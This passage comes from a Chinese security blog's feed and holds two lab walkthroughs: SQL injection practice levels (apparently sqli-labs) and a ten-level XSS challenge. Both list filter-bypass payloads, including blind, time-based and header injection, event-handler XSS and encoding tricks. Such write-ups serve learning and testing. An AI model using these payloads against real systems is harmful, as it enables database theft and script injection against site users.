title="双注入GET单引号字符型注入"></a>双注入GET单引号字符型注入</h4><p><code>?id=1&#39; and left(database(),1)=&#39;s&#39; --+</code></p><h4 id="双注入GET双引号字符型注入"><a href="#双注入GET双引号字符型注入" class="headerlink" title="双注入GET双引号字符型注入"></a>双注入GET双引号字符型注入</h4><p><code>?id=1&#39;’ and left(database(),1)=&#39;s&#39; --+</code></p><h4 id="导出文件GET字符型注入"><a href="#导出文件GET字符型注入" class="headerlink" title="导出文件GET字符型注入"></a>导出文件GET字符型注入</h4><p>​       <code>?id=5&#39;))  --+</code></p><p>​      </p><h4 id="布尔型单引号GET盲注"><a href="#布尔型单引号GET盲注" class="headerlink" title="布尔型单引号GET盲注"></a>布尔型单引号GET盲注</h4><p>​      <code>?id=2&#39; --+</code></p><p>​      </p><h4 id="基于时间的GET单引号盲注"><a href="#基于时间的GET单引号盲注" class="headerlink" title="基于时间的GET单引号盲注"></a>基于时间的GET单引号盲注</h4><p>​      <code>?id=1&#39; and if(ascii(substr(database(),1,1))=115,sleep(3),0 %23</code></p><h4 id="基于时间的双引号盲注"><a href="#基于时间的双引号盲注" class="headerlink" title="基于时间的双引号盲注"></a>基于时间的双引号盲注</h4><p>​      <code>?id=1&quot;andif(ascii(substr(database(),1,1))=115,sleep(3),0) %23</code></p><p>#### </p><p>尝试一下基本的：</p><p>username = admin’ or 1=1# </p><p>password = admin</p><p>发现登录成功，所以存在注入点。</p><p>查看一下有多少列，当试到3时报错，说明存在两列字段</p><p>username = admin’ or 1=1 order by 3#</p><p>12.第12关</p><p>这题和上一题基本一样，不同的是username用双引号加括号包裹。</p><p>admin”) or 1=1#</p><p>13.第13关</p><p>这题是单引号加括号闭合，但是输入payload时却没有回显，看来只能用盲注了。</p><p>username = admin’) or ascii(substr(database(),1,1))=115#</p><p>14.第14关</p><p>和Less-13一样，将单引号和括号改成双引号即可。</p><p>admin” or 1=1#</p><p>15.第15关</p><p>和上面一样，将payload改为单引号。</p><p>admin’ or 1=1#</p><p>16.第16关</p><p>admin”) or 1=1#</p><p>17.第17关</p><p>标题上面写的password reset，所以尝试一下在password一栏里面进行注入。</p><p>username = admin</p><p>password = admin’ or 1=1# </p><p>得到了正确的回显，说明方向正确。但是在猜测表的行列时出现了问题，无法显示有多少列。所以尝试一下布尔盲注。</p><p>username = admin</p><p>password = admin’ or ascii(substr(database(),1,1))=115#</p><p>得到了正确的回显。</p><p>18.第18关</p><p>首先我们抓包，可以看到本机的ip地址，查看源码</p><p>\1.  php  </p><p>\2.  $uagent = $_SERVER[‘HTTP_USER_AGENT’];  </p><p>\3.  $IP = $_SERVER[‘REMOTE_ADDR’];  </p><p>源码使用<code>HTTP_USER_AGENT</code>只获取了HTTP请求头的一个部分：<code>User-Agent</code>。</p><p> 而获取IP则使用了<code>REMOTE_ADDR</code>，这能直接获取TCP协议数据包的底层会话IP地址，它能被代理服务器或路由修改伪造，但非修改XFF头就可以更改的。用已知的用户名登陆一下，并且测试一下X-Forwarded-For和User-Agent。</p><p><img src="https://s2.ax1x.com/2019/03/07/kxQCX4.png" alt></p><p>经过这次尝试可以看到：修改XFF头对IP没有影响，登陆成功会回显你的<code>User-Agent</code>。</p><p> 这里要输入正确的账号和密码才能绕过账号密码判断，进入处理<code>User-Agent</code>部分。这跟现实中的注册登录再注入是比较贴合。所以注入点就在<code>User-Agent</code>处。</p><p>这里我们仍需要根据回显报错来判断<code>INSERT</code>语句结构，首先任意尝试：</p><p>User-Agent: ‘ updatexml(1,concat(‘#’,(database())),0)–+`</p><p>查看源码，我们可以看到<code>uagent</code>是在<code>IP</code>和<code>uname</code>之前的：</p><p>$insert=”INSERT INTO <code>security</code>.<code>uagents</code> (<code>uagent</code>, <code>ip_address</code>, <code>username</code>) VALUES (‘$uagent’, ‘$IP’, $uname)”;</p><p>构造<code>payload</code></p><p>&lt;!–￼0–&gt;</p><p>1’ union select 1,2,3#</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">直接可以得到`1&apos; union select 1,2,database()#`</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">21.第21关</span><br><span class="line"></span><br><span class="line">上一关一样，输入用户名登录，uname=Dumb，passwd=Dumb，登陆之后，可以看到和上一关的很像，但是还是有差别的，`uname=Dumb`变成了`uname = RHVtYg==`</span><br><span class="line"></span><br><span class="line">明显这里是经过了base64加密后的数据。那么我们尝试在将值进行base64加密后输入。</span><br></pre></td></tr></table></figure><p>1’) union select 1,2,database()#<br>```</p><p>加密后：`base64:</p><p> RHVtcCcpIHVuaW9uIHNlbGVjdCAxLDIsZGF0YWJhc2UoKSM=`</p><p>22.第22关</p><p>方法和上一关基本一致，闭合用双引号即可。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla
      
    
    </summary>
    
      <category term="网络攻防" scheme="http://yoursite.com/categories/%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2/"/>
    
    
      <category term="网络攻防" scheme="http://yoursite.com/tags/%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2/"/>
    
      <category term="SQL" scheme="http://yoursite.com/tags/SQL/"/>
    
  </entry>
  
  <entry>
    <title>XSS跨站脚本攻击</title>
    <link href="http://yoursite.com/2019/07/12/XSS%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB/"/>
    <id>http://yoursite.com/2019/07/12/XSS跨站脚本攻击/</id>
    <published>2019-07-12T11:01:27.000Z</published>
    <updated>2019-07-20T07:44:17.048Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h3 id="Test-1"><a href="#Test-1" class="headerlink" title="Test 1"></a>Test 1</h3><p>没有过滤，网页源码为</p><img src="/2019/07/12/XSS跨站脚本攻击/tu1.jpg" title="图1"><p>所以payload为: </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(123)&lt;/script&gt;</span><br></pre></td></tr></table></figure><img src="/2019/07/12/XSS跨站脚本攻击/tu2.jpg" title="图2"><h3 id="Test-2"><a href="#Test-2" class="headerlink" title="Test 2"></a>Test 2</h3><p>网页源代码为：<img src="/2019/07/12/XSS跨站脚本攻击/tu3.jpg" title="图3"></p><p>发现红框框起来的部分，需要闭合之前的尖括号和双引号，才能引起弹窗，达成跨站脚本攻击。</p><p>所以 payload为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt;&lt;script&gt;alert(123)&lt;/script&gt;</span><br></pre></td></tr></table></figure><img src="/2019/07/12/XSS跨站脚本攻击/tu4.jpg" title="图4"><h3 id="Test-3"><a href="#Test-3" class="headerlink" title="Test 3"></a>Test 3</h3><p>网页源代码：</p><img src="/2019/07/12/XSS跨站脚本攻击/tu5.jpg" title="图5"><p>网页源码中，红框部分为主要部分，用了<code>htmlspecialchars()</code>函数。该函数的作用是将<code>&lt;</code> <code>&gt;</code> <code>/</code> <code>“</code> <code>“</code> <code>‘</code> <code>‘</code>这些符号进行转义，并且2处都进行了转义，所以我们使用html事件属性。</p><p>我们使用鼠标事件来引起xss弹窗。但是我们首先要闭合之前的单引号。</p><p>所以payload为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&apos; onmouseover=&apos;alert(2333)   这时我们把鼠标移到搜索框附近就会引起弹窗，攻击成功</span><br></pre></td></tr></table></figure><img src="/2019/07/12/XSS跨站脚本攻击/tu6.jpg" title="图6">)<h3 id="Test-4"><a href="#Test-4" class="headerlink" title="Test 4"></a>Test 4</h3><p>与上一关不同的是，出现的第一处发生了<code>htmlspecialchars()</code>转义，第二处过滤了<code>&lt;</code>和<code>&gt;</code>两个符号（替换成空），并将<code>value=</code>后面的单引号换成了双引号。这样我们直接将上题Payload 中单引号换成双引号，最后鼠标滑过触发XSS 。</p><img src="/2019/07/12/XSS跨站脚本攻击/tu7.jpg" title="图7"><p>所以payload为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">”nmouseover=”lert(2333)</span><br></pre></td></tr></table></figure><img src="/2019/07/12/XSS跨站脚本攻击/tu8.jpg" title="图8"><h3 id="Test-5"><a href="#Test-5" class="headerlink" title="Test 5"></a>Test 5</h3><p>查看网页源代码发现on中间插入下划线_ ，并且发现<code>script</code>也被过滤，所以我们用<code>html</code>链接形式触发xss。首先我们闭合双引号，其次闭合尖括号；然后我们用链接触发xss。</p><img src="/2019/07/12/XSS跨站脚本攻击/tu9.jpg" title="图9"><p>所以payload为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt;&lt;a href=&quot;javascript:alert(123)&quot;&gt; 然后点击。便可触发</span><br></pre></td></tr></table></figure><img src="/2019/07/12/XSS跨站脚本攻击/tu10.jpg" title="图10"><h3 id="Test-6"><a href="#Test-6" class="headerlink" title="Test 6"></a>Test 6</h3><p>首先我们用上次的payload尝试，发现不可行。查看网页源代码，发现有很多关键词都加入了下划线_ 进行了屏蔽，但是查看网页源码，发现我们之前填写的payload并没有被大小写统一，所以我们可以用大小写混用绕过屏蔽。</p><img src="/2019/07/12/XSS跨站脚本攻击/tu11.jpg" title="图11"><p><img src="file:///C:/Users/5454/AppData/Local/Temp/msohtmlclip1/01/clip_image024.jpg" alt="img"></p><p>所以payload为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt;&lt;a hRef=&quot;javascript:alert(123)&quot;&gt; 并点击，便能触发xss</span><br></pre></td></tr></table></figure><img src="/2019/07/12/XSS跨站脚本攻击/tu12.jpg" title="图12"><h3 id="Test-7"><a href="#Test-7" class="headerlink" title="Test 7"></a>Test 7</h3><p>用之前的payload，发现并不能，然后查看网页源码。发现许多关键字被屏蔽了，并且被替换成空。我们可使用双写绕过，使得替换后的结果是我们所期望的。首先闭合双引号和尖括号，其次双写绕过。</p><img src="/2019/07/12/XSS跨站脚本攻击/tu13.jpg" title="图13">)<p>所以payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt;&lt;a hrhrefef=&quot;javascrscriptipt:alert(123)&quot;&gt; 然后点击，触发弹窗</span><br></pre></td></tr></table></figure><img src="/2019/07/12/XSS跨站脚本攻击/tu14.jpg" title="图14">)<h3 id="Test-8"><a href="#Test-8" class="headerlink" title="Test 8"></a>Test 8</h3><p>算了，不尝试之前的payload了，反正就没对过，直接看网页源码吧。</p><img src="/2019/07/12/XSS跨站脚本攻击/tu15.jpg" title="图15">)<p>发现几乎所有关键字都被加了下划线_ 都被屏蔽，我们可以使用<code>Unicode</code>编码绕过。</p><p>Payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javascrip&amp;#116;:alert(123) 然后点击友情链接，便可以触发xss弹窗。</span><br></pre></td></tr></table></figure><img src="/2019/07/12/XSS跨站脚本攻击/tu16.jpg" title="图16"><h3 id="Test-9"><a href="#Test-9" class="headerlink" title="Test 9"></a>Test 9</h3><p>尝试之前的payload，发现404了，并为触发弹窗，攻击失败。查看源码，发现多了一个<code>if</code>判断语句。判断内容是是否含有<code>http://</code>，如果没有，就会显示连接不合法之类的。我们可以使用注释绕过</p><img src="/2019/07/12/XSS跨站脚本攻击/tu17.jpg" title="图17"><p>所以payload为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javascrip&amp;#116;:alert(123)/*http://*/</span><br></pre></td></tr></table></figure><img src="/2019/07/12/XSS跨站脚本攻击/tu20.jpg" title="图18"><h3 id="Test-10"><a href="#Test-10" class="headerlink" title="Test 10"></a>Test 10</h3><p>查看网页源码，发现有许多<code>hidden</code>隐藏项，我们可以利用<code>sort</code>函数，并且利用<code>html</code>事件触发来触发xss。</p><img src="/2019/07/12/XSS跨站脚本攻击/tu19.jpg" title="图19"><p>所以 payload为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&amp;t_sort=&quot; onmouseover=&quot;alert(123)&quot; type=&quot;text</span><br></pre></td></tr></table></figure><img src="/2019/07/12/XSS跨站脚本攻击/tu20.jpg" title="图20">]]></content>
    
    <summary type="html">
    
      
      
        &lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla
      
    
    </summary>
    
      <category term="网络攻防" scheme="http://yoursite.com/categories/%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2/"/>
    
    
      <category term="网络攻防" scheme="http://yoursite.com/tags/%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2/"/>
    
      <category term="XSS" scheme="http://yoursite.com/tags/XSS/"/>
    
  </entry>
  
</feed>
